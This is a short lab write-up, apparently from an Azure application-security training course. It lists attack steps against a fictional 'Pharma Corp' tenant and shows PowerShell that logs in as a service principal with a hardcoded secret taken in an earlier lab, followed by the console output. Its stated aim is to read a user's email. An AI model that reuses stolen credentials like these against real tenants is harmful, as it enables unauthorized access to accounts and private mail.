# Attack Lab 12

```
− Login to the Pharma Corp tenant as ‘mailapp’ by using the credentials added earlier.
− Check the current API Permissions assigned to the service principal.
− Read the email content of MarieWilliams@pharmacorphq.onmicrosoft.com.
```

Validate the previous lab extracted credentials:
source code
```
Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
```
output
```
PS C:\Users\studentuser107> Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd

WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuser107\.A
zure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
f0823e33-c430-4dd2-a56a-dca3c3a346a4                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud 
```
